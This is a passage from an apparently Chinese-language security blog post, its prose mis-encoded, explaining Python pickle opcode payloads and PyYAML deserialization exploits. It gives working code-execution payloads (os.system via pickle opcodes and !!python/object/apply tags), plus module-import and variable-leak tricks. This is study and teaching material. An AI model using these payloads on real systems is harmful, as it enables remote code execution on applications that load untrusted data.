class="hljs-string">   83: S            STRING     &#x27;__builtins__&#x27;</span><br><span class="hljs-string">   99: t            TUPLE      (MARK at 62)</span><br><span class="hljs-string">  100: R        REDUCE</span><br><span class="hljs-string">  101: S        STRING     &#x27;eval&#x27;</span><br><span class="hljs-string">  109: t        TUPLE      (MARK at 18)</span><br><span class="hljs-string">  110: R    REDUCE</span><br><span class="hljs-string">  111: (    MARK</span><br><span class="hljs-string">  112: S        STRING     &#x27;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#x27;</span><br><span class="hljs-string">  149: t        TUPLE      (MARK at 111)</span><br><span class="hljs-string">  150: R    REDUCE</span><br><span class="hljs-string">  151: .    STOP</span><br><span class="hljs-string">highest protocol among opcodes = 1</span><br><span class="hljs-string">lewiserii\lewiserii</span><br><span class="hljs-string">0</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># ä¸ä½¿ç”¨Rå­—èŠ‚ç </span><br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> pickletools<br><br>opcode = <span class="hljs-string">b&#x27;\x80\x03(cbuiltins\ngetattr\np0\ncbuiltins\ndict\np1\nX\x03\x00\x00\x00getop2\n0(g2\n(cbuiltins\nglobals\noX\x0C\x00\x00\x00__builtins__op3\n(g0\ng3\nX\x04\x00\x00\x00evalop4\n(g4\nX\x21\x00\x00\x00__import__(&quot;os&quot;).system(&quot;whoami&quot;)o00.&#x27;</span><br><br>pickletools.dis(pickletools.optimize(opcode))<br>pickle.loads(opcode)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    0: \x80 PROTO      3</span><br><span class="hljs-string">    2: (    MARK</span><br><span class="hljs-string">    3: c        GLOBAL     &#x27;builtins getattr&#x27;</span><br><span class="hljs-string">   21: q        BINPUT     0</span><br><span class="hljs-string">   23: c        GLOBAL     &#x27;builtins dict&#x27;</span><br><span class="hljs-string">   38: X        BINUNICODE &#x27;get&#x27;</span><br><span class="hljs-string">   46: o        OBJ        (MARK at 2)</span><br><span class="hljs-string">   47: q    BINPUT     1</span><br><span class="hljs-string">   49: 0    POP</span><br><span class="hljs-string">   50: (    MARK</span><br><span class="hljs-string">   51: h        BINGET     1</span><br><span class="hljs-string">   53: (        MARK</span><br><span class="hljs-string">   54: c            GLOBAL     &#x27;builtins globals&#x27;</span><br><span class="hljs-string">   72: o            OBJ        (MARK at 53)</span><br><span class="hljs-string">   73: X        BINUNICODE &#x27;__builtins__&#x27;</span><br><span class="hljs-string">   90: o        OBJ        (MARK at 50)</span><br><span class="hljs-string">   91: q    BINPUT     2</span><br><span class="hljs-string">   93: (    MARK</span><br><span class="hljs-string">   94: h        BINGET     0</span><br><span class="hljs-string">   96: h        BINGET     2</span><br><span class="hljs-string">   98: X        BINUNICODE &#x27;eval&#x27;</span><br><span class="hljs-string">  107: o        OBJ        (MARK at 93)</span><br><span class="hljs-string">  108: q    BINPUT     3</span><br><span class="hljs-string">  110: (    MARK</span><br><span class="hljs-string">  111: h        BINGET     3</span><br><span class="hljs-string">  113: X        BINUNICODE &#x27;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#x27;</span><br><span class="hljs-string">  151: o        OBJ        (MARK at 110)</span><br><span class="hljs-string">  152: 0    POP</span><br><span class="hljs-string">  153: 0    POP</span><br><span class="hljs-string">  154: .    STOP</span><br><span class="hljs-string">highest protocol among opcodes = 2</span><br><span class="hljs-string">lewiserii\lewiserii</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure>


<h2 id="opcodeç‰ˆæœ¬"><a href="#opcodeç‰ˆæœ¬" class="headerlink" title="opcodeç‰ˆæœ¬"></a>opcodeç‰ˆæœ¬</h2><p>æœ‰æ—¶å¯ä»¥é€šè¿‡æ”¹å˜opcodeçš„ç‰ˆæœ¬æ¥ç»•è¿‡ä¸€äº›å¯¹å­—æ¯çš„è¿‡æ»¤</p>
<p><img src="/img/summary/python_unserialize-8.png"></p>
<h1 id="PyYAML-ååºåˆ—åŒ–"><a href="#PyYAML-ååºåˆ—åŒ–" class="headerlink" title="PyYAML ååºåˆ—åŒ–"></a>PyYAML ååºåˆ—åŒ–</h1><h2 id="åŸºç¡€è¯­æ³•è§„åˆ™"><a href="#åŸºç¡€è¯­æ³•è§„åˆ™" class="headerlink" title="åŸºç¡€è¯­æ³•è§„åˆ™"></a>åŸºç¡€è¯­æ³•è§„åˆ™</h2><p>1ï¼šå¤§å°å†™æ•æ„Ÿ</p>
<p>2ï¼šä½¿ç”¨ç©ºæ ¼ä»£æ›¿tabé”®ç¼©è¿›è¡¨ç¤ºå±‚çº§ï¼Œå¯¹é½å³å¯è¡¨ç¤ºåŒçº§</p>
<p>3ï¼šå’Œpythonä¸€æ ·ä½¿ç”¨â€™#â€™æ³¨é‡Šå†…å®¹</p>
<p>4ï¼š!!è¡¨ç¤ºå¼ºåˆ¶ç±»å‹è½¬æ¢</p>
<p>5ï¼šä¸€ä¸ª .yml æ–‡ä»¶ä¸­å¯ä»¥æœ‰å¤šä»½é…ç½®æ–‡ä»¶ï¼Œç”¨ â€” éš”å¼€</p>
<p>æ›´å¤šçš„è¯­æ³•è§„åˆ™å¯ä»¥çœ‹<a href="https://pyyaml.org/wiki/PyYAMLDocumentation">å®˜æ–¹æ‰‹å†Œ</a>æˆ–<a href="https://www.runoob.com/w3cnote/yaml-intro.html">èœé¸Ÿæ•™ç¨‹</a>ç­‰</p>
<h2 id="ç±»å‹è½¬æ¢"><a href="#ç±»å‹è½¬æ¢" class="headerlink" title="ç±»å‹è½¬æ¢"></a>ç±»å‹è½¬æ¢</h2><p>åœ¨PyYAMLä¸­ï¼Œå¯ä»¥é€šè¿‡ <code>!!</code> æ¥è¿›è¡Œç±»å‹è½¬æ¢</p>
<p><img src="/img/summary/python_unserialize-9.png"></p>
<p><code>site-packages/yaml/constructor.py</code>ä¸­å¯ä»¥çœ‹åˆ°åŸºç¡€çš„ç±»å‹è½¬æ¢è¿‡ç¨‹</p>
<p>ä¾‹å¦‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># python2</span><br><span class="hljs-comment"># PyYAML4.2b4</span><br><span class="hljs-keyword">import</span> yaml<br>data = yaml.load(<span class="hljs-string">&#x27;!!str 111&#x27;</span>)<br><span class="hljs-built_in">print</span>(data)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(data))<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">111</span><br><span class="hljs-string">&lt;type &#x27;str&#x27;&gt;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure>

<p>å¯¹åº”çš„ä»£ç å¦‚ä¸‹ï¼Œadd_constructorå®šä¹‰äº†ä¸€äº›åŸºç¡€çš„ç±»å‹è½¬æ¢</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">SafeConstructor.add_constructor(<br>        <span class="hljs-string">u&#x27;tag:yaml.org,2002:str&#x27;</span>,<br>        SafeConstructor.construct_yaml_str)<br></code></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">add_constructor</span>(<span class="hljs-params">cls, tag, constructor</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-string">&#x27;yaml_constructors&#x27;</span> <span class="hljs-keyword">in</span> cls.__dict__:<br>        cls.yaml_constructors = cls.yaml_constructors.copy()<br>    cls.yaml_constructors[tag] = constructor<br>add_constructor = <span class="hljs-built_in">classmethod</span>(add_constructor)<br></code></pre></td></tr></table></figure>

<p>strå¯¹åº”çš„å‡½æ•°æ˜¯ construct_yaml_strï¼Œä¸‹æ–­ç‚¹åˆ†æ</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">construct_yaml_str</span>(<span class="hljs-params">self, node</span>):<br>    value = self.construct_scalar(node)<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">return</span> value.encode(<span class="hljs-string">&#x27;ascii&#x27;</span>)<br>    <span class="hljs-keyword">except</span> UnicodeEncodeError:<br>        <span class="hljs-keyword">return</span> value<br></code></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">construct_scalar</span>(<span class="hljs-params">self, node</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(node, MappingNode):<br>        <span class="hljs-keyword">for</span> key_node, value_node <span class="hljs-keyword">in</span> node.value:<br>            <span class="hljs-keyword">if</span> key_node.tag == <span class="hljs-string">u&#x27;tag:yaml.org,2002:value&#x27;</span>:<br>                <span class="hljs-keyword">return</span> self.construct_scalar(value_node)<br>    <span class="hljs-keyword">return</span> BaseConstructor.construct_scalar(self, node)<br></code></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">construct_scalar</span>(<span class="hljs-params">self, node</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">isinstance</span>(node, ScalarNode):<br>        <span class="hljs-keyword">raise</span> ConstructorError(<span class="hljs-literal">None</span>, <span class="hljs-literal">None</span>,<br>                <span class="hljs-string">&quot;expected a scalar node, but found %s&quot;</span> % node.<span class="hljs-built_in">id</span>,<br>                node.start_mark)<br>    <span class="hljs-keyword">return</span> node.value<br></code></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°è½¬æ¢çš„è¿‡ç¨‹ï¼ŒåŒ…æ‹¬nodeçš„å€¼</p>
<p><img src="/img/summary/python_unserialize-10.png"></p>
<p>å½“ç„¶é™¤äº†<code>add_constructor</code>å®šä¹‰çš„åŸºç¡€ç±»å‹å¤–è¿˜æœ‰<code>add_multi_constructor</code>å®šä¹‰çš„5ä¸ªcomplex python tag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">Constructor.add_multi_constructor(<br>    <span class="hljs-string">u&#x27;tag:yaml.org,2002:python/name:&#x27;</span>,<br>    Constructor.construct_python_name)<br><br>Constructor.add_multi_constructor(<br>    <span class="hljs-string">u&#x27;tag:yaml.org,2002:python/module:&#x27;</span>,<br>    Constructor.construct_python_module)<br><br>Constructor.add_multi_constructor(<br>    <span class="hljs-string">u&#x27;tag:yaml.org,2002:python/object:&#x27;</span>,<br>    Constructor.construct_python_object)<br><br>Constructor.add_multi_constructor(<br>    <span class="hljs-string">u&#x27;tag:yaml.org,2002:python/object/apply:&#x27;</span>,<br>    Constructor.construct_python_object_apply)<br><br>Constructor.add_multi_constructor(<br>    <span class="hljs-string">u&#x27;tag:yaml.org,2002:python/object/new:&#x27;</span>,<br>    Constructor.construct_python_object_new)<br></code></pre></td></tr></table></figure>

<p>æ ¹æ®å›¾è¡¨å¯ä»¥çœ‹åˆ°è¿™å‡ ä¸ªéƒ½å¯ä»¥å¼•å…¥æ–°çš„æ¨¡å—ï¼Œè¿™æ­£æ˜¯ PyYAML å­˜åœ¨ååºåˆ—åŒ–æ¼æ´çš„åŸå› </p>
<h2 id="PyYAML-lt-5-1"><a href="#PyYAML-lt-5-1" class="headerlink" title="PyYAML &lt; 5.1"></a>PyYAML &lt; 5.1</h2><p>PyYAML çš„åˆ©ç”¨åˆ’åˆ†ä»¥ç‰ˆæœ¬ 5.1 ä¸ºç•Œé™ï¼Œ5.1ä»¥ä¸‹åˆ©ç”¨ç›¸å¯¹è¾ƒç®€å•ï¼Œ5.1ä»¥ä¸Šåˆ©ç”¨ç›¸å¯¹ç¨éº»çƒ¦</p>
<p>&lt;5.1çš„ç‰ˆæœ¬ä¸­ä¸€å…±æœ‰ä¸‰ä¸ªæ„é€ å™¨ï¼Œåˆ†åˆ«æ˜¯</p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">BaseConstructorï¼šæœ€æœ€åŸºç¡€çš„æ„é€ å™¨ï¼Œä¸æ”¯æŒå¼ºåˆ¶ç±»å‹è½¬æ¢<br>SafeConstructorï¼šé›†æˆ BaseConstructorï¼Œå¼ºåˆ¶ç±»å‹è½¬æ¢å’Œ YAML è§„èŒƒä¿æŒä¸€è‡´ï¼Œæ²¡æœ‰é­”æ”¹<br>Constructorï¼šåœ¨ YAML è§„èŒƒä¸Šæ–°å¢äº†å¾ˆå¤šå¼ºåˆ¶ç±»å‹è½¬æ¢ï¼Œæ˜¯é»˜è®¤ä½¿ç”¨çš„æ„é€ å™¨<br></code></pre></td></tr></table></figure>


<h3 id="python-x2F-object-x2F-apply"><a href="#python-x2F-object-x2F-apply" class="headerlink" title="python&#x2F;object&#x2F;apply"></a>python&#x2F;object&#x2F;apply</h3><p>construct_python_object_apply</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">construct_python_object_apply</span>(<span class="hljs-params">self, suffix, node, newobj=<span class="hljs-literal">False</span></span>):<br>        <span class="hljs-comment"># Format:</span><br>        <span class="hljs-comment">#   !!python/object/apply       # (or !!python/object/new)</span><br>        <span class="hljs-comment">#   args: [ ... arguments ... ]</span><br>        <span class="hljs-comment">#   kwds: &#123; ... keywords ... &#125;</span><br>        <span class="hljs-comment">#   state: ... state ...</span><br>        <span class="hljs-comment">#   listitems: [ ... listitems ... ]</span><br>        <span class="hljs-comment">#   dictitems: &#123; ... dictitems ... &#125;</span><br>        <span class="hljs-comment"># or short format:</span><br>        <span class="hljs-comment">#   !!python/object/apply [ ... arguments ... ]</span><br>        <span class="hljs-comment"># The difference between !!python/object/apply and !!python/object/new</span><br>        <span class="hljs-comment"># is how an object is created, check make_python_instance for details.</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(node, SequenceNode):<br>            args = self.construct_sequence(node, deep=<span class="hljs-literal">True</span>)<br>            kwds = &#123;&#125;<br>            state = &#123;&#125;<br>            listitems = []<br>            dictitems = &#123;&#125;<br>        <span class="hljs-keyword">else</span>:<br>            value = self.construct_mapping(node, deep=<span class="hljs-literal">True</span>)<br>            args = value.get(<span class="hljs-string">&#x27;args&#x27;</span>, [])<br>            kwds = value.get(<span class="hljs-string">&#x27;kwds&#x27;</span>, &#123;&#125;)<br>            state = value.get(<span class="hljs-string">&#x27;state&#x27;</span>, &#123;&#125;)<br>            listitems = value.get(<span class="hljs-string">&#x27;listitems&#x27;</span>, [])<br>            dictitems = value.get(<span class="hljs-string">&#x27;dictitems&#x27;</span>, &#123;&#125;)<br>        <span class="hljs-comment"># è°ƒç”¨ make_python_instance è·å–æ¨¡å—ä¸­çš„æ–¹æ³•å¹¶æ‰§è¡Œ</span><br>        instance = self.make_python_instance(suffix, node, args, kwds, newobj)<br>        <span class="hljs-keyword">if</span> state:<br>            self.set_python_instance_state(instance, state)<br>        <span class="hljs-keyword">if</span> listitems:<br>            instance.extend(listitems)<br>        <span class="hljs-keyword">if</span> dictitems:<br>            <span class="hljs-keyword">for</span> key <span class="hljs-keyword">in</span> dictitems:<br>                instance[key] = dictitems[key]<br>        <span class="hljs-keyword">return</span> instance<br></code></pre></td></tr></table></figure>

<p>è°ƒç”¨ make_python_instance è·å–æ¨¡å—ä¸­çš„æ–¹æ³•å¹¶æ‰§è¡Œ</p>
<p><img src="/img/summary/python_unserialize-11.png"></p>
<p>payload</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># short formatå½¢å¼</span><br><span class="hljs-comment"># !!python/object/apply [ ... arguments ... ]</span><br>yaml.load(<span class="hljs-string">&#x27;!!python/object/apply:os.system [&quot;whoami&quot;]&#x27;</span>)<br>yaml.load(<span class="hljs-string">&quot;!!python/object/apply:os.system [&#x27;whoami&#x27;]&quot;</span>)<br>yaml.load(<span class="hljs-string">&quot;!!python/object/apply:os.system [whoami]&quot;</span>)<br>yaml.load(<span class="hljs-string">&quot;!!python/object/apply:subprocess.Popen [&#x27;whoami&#x27;]&quot;</span>)<br><br><br><span class="hljs-comment"># å…¶ä»–å‡ ç§è¡¨ç°å½¢å¼</span><br>yaml.load(<span class="hljs-string">&quot;exp: !!python/object/apply:os.system [whoami]&quot;</span>)<br><br>yaml.load(<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">exp: !!python/object/apply:os.system</span><br><span class="hljs-string">- whoami</span><br><span class="hljs-string">&quot;&quot;&quot;</span>)<br><br>yaml.load(<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">exp: !!python/object/apply:os.system</span><br><span class="hljs-string">  args: [&quot;whoami&quot;]</span><br><span class="hljs-string">&quot;&quot;&quot;</span>)<br><br><span class="hljs-comment"># command æ˜¯ os.system çš„å‚æ•°å(å¯ä»¥é€šè¿‡help(os.system)æŸ¥çœ‹)</span><br>yaml.load(<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">exp: !!python/object/apply:os.system</span><br><span class="hljs-string">  kwds: &#123;&quot;command&quot;: &quot;whoami&quot;&#125;</span><br><span class="hljs-string">&quot;&quot;&quot;</span>)<br><br>yaml.load(<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">!!python/object/apply:os.system</span><br><span class="hljs-string">- whoami</span><br><span class="hljs-string">&quot;&quot;&quot;</span>)<br></code></pre></td></tr></table></figure>

<h3 id="python-x2F-object-x2F-new"><a href="#python-x2F-object-x2F-new" class="headerlink" title="python&#x2F;object&#x2F;new"></a>python&#x2F;object&#x2F;new</h3><p>å¯¹åº”çš„ construct_python_object_new åªæœ‰ä¸€è¡Œä»£ç ï¼Œè°ƒç”¨äº†construct_python_object_apply</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">construct_python_object_new</span>(<span class="hljs-params">self, suffix, node</span>):<br>    <span class="hljs-keyword">return</span> self.construct_python_object_apply(suffix, node, newobj=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure>

<p>å”¯ä¸€ä¸åŒçš„æ˜¯newobjå‚æ•°ä¸ä¸€æ ·ï¼Œè¿™ä¸ªå‚æ•°å½±å“äº† make_python_instance ä¸­çš„ä¸€ä¸ªåˆ¤æ–­</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> newobj <span class="hljs-keyword">and</span> <span class="hljs-built_in">isinstance</span>(cls, <span class="hljs-built_in">type</span>):<br>    <span class="hljs-keyword">return</span> cls.__new__(cls, *args, **kwds)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-keyword">return</span> cls(*args, **kwds)<br></code></pre></td></tr></table></figure>

<p>åŸºæœ¬ä¸å½±å“ï¼Œæ‰€ä»¥ python&#x2F;object&#x2F;new å’Œ python&#x2F;object&#x2F;apply å¯ä»¥çœ‹ä½œæ˜¯åŒä¸€ä¸ª</p>
<h3 id="python-x2F-object"><a href="#python-x2F-object" class="headerlink" title="python&#x2F;object"></a>python&#x2F;object</h3><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">construct_python_object</span>(<span class="hljs-params">self, suffix, node</span>):<br>    <span class="hljs-comment"># Format:</span><br>    <span class="hljs-comment">#   !!python/object:module.name &#123; ... state ... &#125;</span><br>    instance = self.make_python_instance(suffix, node, newobj=<span class="hljs-literal">True</span>)<br>    <span class="hljs-keyword">yield</span> instance<br>    deep = <span class="hljs-built_in">hasattr</span>(instance, <span class="hljs-string">&#x27;__setstate__&#x27;</span>)<br>    state = self.construct_mapping(node, deep=deep)<br>    self.set_python_instance_state(instance, state)<br></code></pre></td></tr></table></figure>

<p>æ‰§è¡Œ make_python_instance æ—¶å¹¶æ²¡æœ‰ä¼  args æˆ– kwds å‚æ•°ï¼Œæ‰€ä»¥åªèƒ½æ‰§è¡Œæ— å‚å‡½æ•°</p>
<p>ä¾‹å¦‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> yaml<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        self.name = <span class="hljs-string">&quot;&quot;</span><br><br><br>payload1 = <span class="hljs-string">&quot;&quot;&quot;!!python/object:__main__.User</span><br><span class="hljs-string">name: aaa</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>payload2 = <span class="hljs-string">&quot;!!python/object:__main__.User &#123;name: aaa&#125;&quot;</span><br><br>data1 = yaml.load(payload1)<br><span class="hljs-built_in">print</span>(data1.name)<br><br>data2 = yaml.load(payload2)<br><span class="hljs-built_in">print</span>(data2.name)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">aaa</span><br><span class="hljs-string">aaa</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure>


<h3 id="python-x2F-module"><a href="#python-x2F-module" class="headerlink" title="python&#x2F;module"></a>python&#x2F;module</h3><p>ä»£ç ä¸­åªè°ƒç”¨äº† find_python_module æ¥å¯¼å…¥æ¨¡å—</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">construct_python_module</span>(<span class="hljs-params">self, suffix, node</span>):<br>    value = self.construct_scalar(node)<br>    <span class="hljs-keyword">if</span> value:<br>        <span class="hljs-keyword">raise</span> ConstructorError(<span class="hljs-string">&quot;while constructing a Python module&quot;</span>, node.start_mark,<br>                <span class="hljs-string">&quot;expected the empty value, but found %r&quot;</span> % value, node.start_mark)<br>    <span class="hljs-keyword">return</span> self.find_python_module(suffix, node.start_mark)<br></code></pre></td></tr></table></figure>

<p>è™½ç„¶ construct_python_module æ²¡æœ‰è°ƒç”¨é€»è¾‘ï¼Œä½†æ˜¯ä¸ä»»æ„æ–‡ä»¶ä¸Šä¼ æ­é…æœ‰å¥‡æ•ˆ</p>
<p>æ¯”å¦‚åœ¨uploadç›®å½•ä¸‹ä¸Šä¼ äº†æ¶æ„æ–‡ä»¶exp.py</p>
<p><img src="/img/summary/python_unserialize-12.png"></p>
<p>å°±å¯ä»¥ç”¨<code>!!python/module:upload.exp</code>æ¥å¯¼å…¥</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> yaml<br><br>yaml.load(<span class="hljs-string">&#x27;!!python/module:upload.exp&#x27;</span>)<br><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">root</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure>


<p>ä¸€ä¸ªå°æŠ€å·§ï¼š<br>å½“æ–‡ä»¶åæ˜¯ __init__.py æ—¶ï¼Œç›´æ¥å¯¼å…¥ç›®å½•åå³å¯ï¼Œå¯ä»¥ç»•è¿‡.çš„é™åˆ¶</p>
<h3 id="python-x2F-name"><a href="#python-x2F-name" class="headerlink" title="python&#x2F;name"></a>python&#x2F;name</h3><p>ä»£ç é€»è¾‘ä¸ python&#x2F;module éå¸¸ç›¸ä¼¼ï¼Œä¸è¿‡moduleåªè¿”å›æ¨¡å—ï¼Œè€Œnameè¿”å›æ¨¡å—ä¸‹çš„å±æ€§å’Œæ–¹æ³•</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">construct_python_name</span>(<span class="hljs-params">self, suffix, node</span>):<br>    value = self.construct_scalar(node)<br>    <span class="hljs-keyword">if</span> value:<br>        <span class="hljs-keyword">raise</span> ConstructorError(<span class="hljs-string">&quot;while constructing a Python name&quot;</span>, node.start_mark,<br>                <span class="hljs-string">&quot;expected the empty value, but found %r&quot;</span> % value, node.start_mark)<br>    <span class="hljs-keyword">return</span> self.find_python_name(suffix, node.start_mark)<br></code></pre></td></tr></table></figure>

<p>è¿™ä¸ªç‰¹æ€§å¸¸ç”¨åœ¨è·å–æœªçŸ¥å˜é‡çš„å€¼ä¸Š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> yaml<br><br>key = <span class="hljs-string">&quot;k1y.....&quot;</span><br><br>config = <span class="hljs-string">&#x27;!!python/name:__main__.key&#x27;</span><br><span class="hljs-built_in">print</span>(yaml.load(config))<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">k1y.....</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure>


<h2 id="PyYAML-gt-x3D-5-1"><a href="#PyYAML-gt-x3D-5-1" class="headerlink" title="PyYAML &gt;&#x3D; 5.1"></a>PyYAML &gt;&#x3D; 5.1</h2><p>æ–°å¢çš„<br>1ï¼šFullConstructorï¼šé»˜è®¤çš„æ„é€ å™¨ã€‚<br>2ï¼šUnsafeConstructorï¼šæ”¯æŒå…¨éƒ¨çš„å¼ºåˆ¶ç±»å‹è½¬æ¢<br>3ï¼šConstructorï¼šç­‰åŒäº UnsafeConstructor</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">__all__ = [<br>    <span class="hljs-string">&#x27;BaseConstructor&#x27;</span>,<br>    <span class="hljs-string">&#x27;SafeConstructor&#x27;</span>,<br>    <span class="hljs-string">&#x27;FullConstructor&#x27;</span>,<br>    <span class="hljs-string">&#x27;UnsafeConstructor&#x27;</span>,<br>    <span class="hljs-string">&#x27;Constructor&#x27;</span>,<br>    <span class="hljs-string">&#x27;ConstructorError&#x27;</span><br>]<br></code></pre></td></tr></table></figure>

<p>å¦‚æœæŒ‡å®šçš„æ„é€ å™¨æ˜¯ UnsafeConstructor æˆ–è€… Constructor ï¼Œé‚£ä¹ˆç›´æ¥ç”¨&lt;5.1çš„æ–¹æ³•æ‰“å°±å¥½äº†</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">yaml.unsafe_load(exp)<br>yaml.unsafe_load_all(exp)<br>yaml.load(exp, Loader=Loader)<br>yaml.load(exp, Loader=UnsafeLoader)<br>yaml.load_all(exp, Loader=Loader)<br>yaml.load_all(exp, Loader=UnsafeLoader)<br></code></pre></td></tr></table></figure>

<h3 id="é»˜è®¤æ„é€ å™¨ä¸‹çš„åˆ©ç”¨æ–¹å¼"><a href="#é»˜è®¤æ„é€ å™¨ä¸‹çš„åˆ©ç”¨æ–¹å¼" class="headerlink" title="é»˜è®¤æ„é€ å™¨ä¸‹çš„åˆ©ç”¨æ–¹å¼"></a>é»˜è®¤æ„é€ å™¨ä¸‹çš„åˆ©ç”¨æ–¹å¼</h3><p>è¿™é‡Œä»¥ PyYAML&#x3D;&#x3D;5.1 ä¸ºä¾‹å­</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">make_python_instance</span>(<span class="hljs-params">self, suffix, node,</span><br><span class="hljs-params">        args=<span class="hljs-literal">None</span>, kwds=<span class="hljs-literal">None</span>, newobj=<span class="hljs-literal">False</span>, unsafe=<span class="hljs-literal">False</span></span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> args:<br>        args = []<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> kwds:<br>        kwds = &#123;&#125;<br>    cls = self.find_python_name(suffix, node.start_mark)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> (unsafe <span class="hljs-keyword">or</span> <span class="hljs-built_in">isinstance</span>(cls, <span class="hljs-built_in">type</span>)):<br>        <span class="hljs-keyword">raise</span> ConstructorError(<span class="hljs-string">&quot;while constructing a Python instance&quot;</span>, node.start_mark,<br>                <span class="hljs-string">&quot;expected a class, but found %r&quot;</span> % <span class="hljs-built_in">type</span>(cls),<br>                node.start_mark)<br>    <span class="hljs-keyword">if</span> newobj <span class="hljs-keyword">and</span> <span class="hljs-built_in">isinstance</span>(cls, <span class="hljs-built_in">type</span>):<br>        <span class="hljs-keyword">return</span> cls.__new__(cls, *args, **kwds)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> cls(*args, **kwds)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">find_python_name</span>(<span class="hljs-params">self, name, mark, unsafe=<span class="hljs-literal">False</span></span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> name:<br>        <span class="hljs-keyword">raise</span> ConstructorError(<span class="hljs-string">&quot;while constructing a Python object&quot;</span>, mark,<br>                <span class="hljs-string">&quot;expected non-empty name appended to the tag&quot;</span>, mark)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;.&#x27;</span> <span class="hljs-keyword">in</span> name:<br>        module_name, object_name = name.rsplit(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">else</span>:<br>        module_name = <span class="hljs-string">&#x27;builtins&#x27;</span><br>        object_name = name<br>    <span class="hljs-keyword">if</span> unsafe:<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-built_in">__import__</span>(module_name)<br>        <span class="hljs-keyword">except</span> ImportError <span class="hljs-keyword">as</span> exc:<br>            <span class="hljs-keyword">raise</span> ConstructorError(<span class="hljs-string">&quot;while constructing a Python object&quot;</span>, mark,<br>                    <span class="hljs-string">&quot;cannot find module %r (%s)&quot;</span> % (module_name, exc), mark)<br>    <span 